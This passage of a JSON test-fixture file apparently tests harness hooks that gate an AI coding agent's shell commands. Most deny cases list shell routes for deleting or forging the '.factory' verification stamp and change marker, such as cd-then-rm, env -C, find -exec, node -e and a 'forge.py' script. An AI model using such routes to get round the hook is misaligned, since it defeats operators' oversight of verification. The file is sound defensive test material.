  "ruleId": "spend.opt-in",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "node scripts/run-suite.mjs --continue wallet-order.spec.ts"
   }
  },
  "expect": "deny",
  "messageContains": [
   "wallet-order.spec.ts",
   "without --include-spend"
  ]
 },
 {
  "name": "spend-gate.ignore-other-command",
  "hook": "spend-gate",
  "ruleId": "spend.opt-in",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "cat tests/spend-list.json | grep wallet-order"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-copy-out-install",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "install -m 644 .factory/verify-stamp /tmp/stamp"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-copy-out-recursive",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "cp -r .factory /tmp/state-copy"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-copy-out-target-dir-cluster",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "cp -rt /tmp/state-copy .factory"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-copy-out",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "cp .factory/verify-stamp /tmp/stamp-copy.json"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-cp-target-dir-out",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "cp -t /tmp .factory/verify-stamp"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-echo-mention",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "echo see .factory/verify-stamp"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-env-chdir-other-dir-armed",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "cat .factory/x; env -C sub rm notes.txt"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-env-chdir-reader",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "env -C .factory cat verify-stamp"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-factory-in-file-name-sed",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "sed -n 1,20p tests/factories/order.factory.ts && rm -f tests/tmp/*.json"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-factory-in-file-name",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "cat tests/data/user.factory.ts; rm -rf \"$OUT\""
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-git-commit-all-message",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "git commit -am 'x .factory/x'"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-git-commit-long-message",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "git commit --message='x .factory/y'"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-git-commit-message-names-state",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "git commit -m 'update .factory docs'"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-git-diff-pathspec",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "git diff -- .factory"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-git-log-marker",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "git log -- .factory/current-change"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-git-show-blob",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "git show HEAD:.factory/current-change"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-git-status-pathspec",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "git status .factory"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-git-tag-message",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "git tag -m 'x .factory' v1"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-quoted-redirect-text",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "echo \"> .factory/stamp is protected\""
   }
  },
  "expect": "allow",
  "warn": false,
  "_comment": "A quoted string is an argument, not a redirect."
 },
 {
  "name": "state-gate.allow-quoted-state-dir-to-reader",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "echo \".factory\""
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-quoted-verb-text",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "git commit -m 'mv x .factory/verify-stamp'"
   }
  },
  "expect": "allow",
  "warn": false,
  "_comment": "A commit message is inert text."
 },
 {
  "name": "state-gate.allow-read-diff-stderr-null",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "diff .factory/a .factory/b 2>/dev/null"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-read-find",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "find .factory -name 'verify-*' -type f"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-read-grep",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "grep -r stamp .factory"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-read-head",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "head -c 10 .factory/verify-stamp"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-read-in-state-dir-redirect-absolute",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "cd .factory && ls > /tmp/listing"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-read-in-state-dir",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "cd .factory && cat verify-stamp"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-read-jq",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "jq . .factory/verify-stamp"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-read-ls",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "ls -la .factory"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-read-redirect-elsewhere",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "cat .factory/verify-stamp > /tmp/stamp-copy.json"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-read-test",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "[ -f .factory/verify-stamp ] && echo yes"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-read-then-write-elsewhere",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "cat .factory/verify-stamp && rm /tmp/old-copy"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.allow-read",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "cat .factory/verify-stamp && cat .factory/current-change 2>/dev/null"
   }
  },
  "expect": "allow",
  "warn": false,
  "_comment": "Reading the trust anchors is fine."
 },
 {
  "name": "state-gate.allow-stamp-name-with-suffix",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "sed -i s/a/b/ docs/verify-stamp.md"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "state-gate.deny-absolute-cd-then-rm",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "cd .factory && cd /tmp; rm verify-stamp"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-cd-then-append",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "cd .factory && printf x >> current-change"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-cd-then-cat-redirect",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "cd .factory && cat > verify-stamp"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-cd-then-redirect-next-line",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "cd .factory\necho x > verify-stamp"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-cd-then-redirect",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "cd .factory && echo x > verify-stamp"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-cd-then-relative-redirect-from-reader",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "cd .factory && cat verify-stamp > copy"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-cd-then-rm",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "cd .factory && rm verify-stamp"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-cd-then-unlisted-command",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "cd .factory && python3 forge.py"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-cd-variable-then-rm",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "D=.factory; cd \"$D\" && rm verify-stamp"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-command-substitution-rm",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "echo $(rm .factory/verify-stamp)"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-cp-into",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "cp /tmp/stamp.json .factory/verify-stamp"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-cp-target-dir-cluster",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "cp -rt .factory /tmp/stamp.json"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ],
  "_comment": "-t inside an option cluster."
 },
 {
  "name": "state-gate.deny-cp-target-dir",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "cp -t .factory /tmp/stamp.json"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-cp-trailing-long-option",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "cp /tmp/x .factory/verify-stamp --suffix .bak"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-cp-trailing-suffix-option",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "cp /tmp/x .factory/verify-stamp -S .bak"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-curl-output",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "curl -o .factory/verify-stamp http://example.test/x"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-dd-of",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "dd if=/tmp/x of=.factory/verify-stamp"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-env-chdir-long-cp",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "env --chdir .factory cp /tmp/x verify-stamp"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-env-chdir-long-equals",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "env --chdir=.factory rm verify-stamp"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-env-chdir-rm",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "env -C .factory rm verify-stamp"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-find-delete",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "find .factory -name verify-stamp -delete"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-find-exec-sh-c",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "find . -exec sh -c 'cp /tmp/x .factory/verify-stamp' \\;"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-find-exec",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "find .factory -exec rm {} \\;"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-find-name-marker-delete",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "find . -name current-change -delete"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-find-name-stamp-exec",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "find . -name verify-stamp -exec cp /tmp/x {} \\;"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-find-path-marker-delete",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "find . -path '*/current-change' -delete"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-git-checkout",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "git checkout -- .factory/verify-stamp"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-git-restore",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "git restore .factory/verify-stamp"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-install-trailing-mode",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "install /tmp/x .factory/verify-stamp -m 644"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-interpreter-runs-state-file",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "python3 .factory/forge.py"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-ln-into-state",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "ln -s x .factory/verify-stamp"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-mv-into-state",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "mv x .factory/verify-stamp"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-mv-out-of-state",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "mv .factory/current-change /tmp/marker"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ],
  "_comment": "Moving the marker away deletes it."
 },
 {
  "name": "state-gate.deny-node-e-names-state",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "node -e \"require('fs').writeFileSync('.factory/verify-stamp','x')\""
   }
  },
  "expect": "deny",
  "messageContains": [
   "[process.state]",
   "trust anchors",
   "npm run verify",
   "factory-gates.md#process.state"
  ]
 },
 {
  "name": "state-gate.deny-overlong-line",
  "hook": "state-gate",
  "ruleId": "process.state",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa